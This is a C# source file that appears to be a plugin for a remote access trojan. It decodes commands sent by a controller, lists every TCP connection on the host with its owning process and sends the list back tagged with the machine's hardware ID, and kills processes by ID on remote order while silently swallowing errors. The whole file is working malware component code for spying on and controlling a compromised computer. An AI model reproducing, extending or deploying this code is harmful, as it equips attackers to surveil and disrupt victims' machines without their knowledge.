using System;
using System.Diagnostics;
using System.Text;
using MessagePackLib.MessagePack;
using Plugin.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            var unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "Netstat":
                {
                    switch (unpack_msgpack.ForcePathObject("Option").AsString)
                    {
                        case "List":
                        {
                            new HandleNetstat().NetstatList();
                            break;
                        }

                        case "Kill":
                        {
                            new HandleNetstat().Kill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                            break;
                        }
                    }
                }
                    break;
            }
        }
    }


    public class HandleNetstat
    {
        public void Kill(int ID)
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (process.Id == ID) process.Kill();
                }
                catch
                {
                }

                ;
            }

            NetstatList();
        }

        public void NetstatList()
        {
            try
            {
                var sb = new StringBuilder();
                var tcpProgressInfoTable = TcpConnectionTableHelper.GetAllTcpConnections();


                var tableRowCount = tcpProgressInfoTable.Length;
                for (var i = 0; i < tableRowCount; i++)
                {
                    var row = tcpProgressInfoTable[i];
                    var source = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.localAddr),
                        row.LocalPort);
                    var dest = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.remoteAddr),
                        row.RemotePort);
                    sb.Append(row.owningPid + "-=>" + source + "-=>" + dest + "-=>" + (TCP_CONNECTION_STATE)row.state +
                              "-=>");
                }

                Debug.WriteLine(sb);
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "netstat";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Message").AsString = sb.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch
            {
            }
        }
    }
}